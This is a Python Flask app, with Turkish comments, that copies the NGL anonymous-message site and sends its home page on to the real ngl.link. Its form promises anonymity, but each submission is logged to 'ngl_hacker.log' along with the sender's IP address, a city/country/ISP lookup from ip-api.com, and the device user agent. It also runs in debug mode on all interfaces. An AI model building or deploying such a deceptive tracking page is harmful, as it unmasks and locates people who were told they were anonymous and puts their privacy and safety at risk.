from flask 
import Flask, request, render_template_string, redirect
import logging
import requests  # IP'den konum çekmek için
from werkzeug.middleware.proxy_fix import ProxyFix
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
app = Flask(__name__)

# Render gibi proxy arkasında gerçek IP'yi almak için gerekli
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)

# Log dosyamız
logging.basicConfig(filename='ngl_hacker.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

# Gerçek NGL tarzı HTML + CSS
NGL_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NGL</title>
    <style>
        body {
            background: linear-gradient(135deg, #000000, #1a0033);
            color: white;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 4rem;
            font-weight: 800;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            font-size: 1.3rem;
            opacity: 0.8;
            margin-bottom: 40px;
        }
        textarea {
            width: 80%;
            max-width: 500px;
            height: 120px;
            background: rgba(255,255,255,0.1);
            border: none;
            border-radius: 16px;
            padding: 20px;
            color: white;
            font-size: 1.2rem;
            resize: none;
            outline: none;
        }
        textarea::placeholder {
            color: rgba(255,255,255,0.6);
        }
        button {
            margin-top: 30px;
            padding: 16px 40px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            transform: scale(1.05);
        }
        .success {
            font-size: 2rem;
            margin-top: 50px;
            animation: fadeIn 1s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    {% if success %}
        <div class="success">✅ Mesajın gönderildi!</div>
        <p>kullanıcı adınız: bilinmiyor</p>
    {% else %}
        <h1>@{{ username }}</h1>
        <p>Anonim mesaj gönder</p>
        <form method="POST">
            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
            <button type="submit">Gönder</button>
        </form>
    {% endif %}
</body>
</html>
"""

@app.route('/<username>', methods=['GET', 'POST'])
def ngl_page(username):
    # 1. IP Adresini Al
    client_ip = request.remote_addr
    if 'X-Forwarded-For' in request.headers:
        client_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
    
    # 2. User Agent (Cihaz Bilgisi) Al
    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')

    # 3. Konum Çekme İşlemi (Fonksiyonun içine alındı)
    try:
        geo = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=5).json()
        if geo.get('status') == 'success':
            location = f"{geo.get('city', 'Bilinmiyor')}, {geo.get('countryCode', 'Bilinmiyor')}"
            isp = geo.get('isp', 'Bilinmiyor')
        else:
            location = "Konum alınamadı (API Hatası)"
            isp = "Bilinmiyor"
    except Exception as e:
        location = "Konum alınamadı (Bağlantı Hatası)"
        isp = "Bilinmiyor"

    # 4. POST İsteği (Mesaj Gönderildiğinde)
    if request.method == 'POST':
        msg = request.form.get('message', '').strip()
        
        log_entry = f"KULLANICI: @{username} | MESAJ: '{msg}' | IP: {client_ip} | KONUM: {location} | ISP: {isp} | CİHAZ: {user_agent[:100]}"
        
        logging.info(log_entry)
        print(f"[LOG] {log_entry}")  # Render loglarında görünmesi için print eklendi
        
        return render_template_string(NGL_HTML, username=username, success=True)
    
    # Sayfa sadece görüntülendiğinde (İsteğe bağlı loglama)
    # logging.info(f"GÖRÜNTÜLENDİ: @{username} | IP: {client_ip}")

    return render_template_string(NGL_HTML, username=username, success=False)

@app.route('/')
def home():
    return redirect("https://ngl.link")  # Ana sayfa NGL'ye yönlendirilir

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
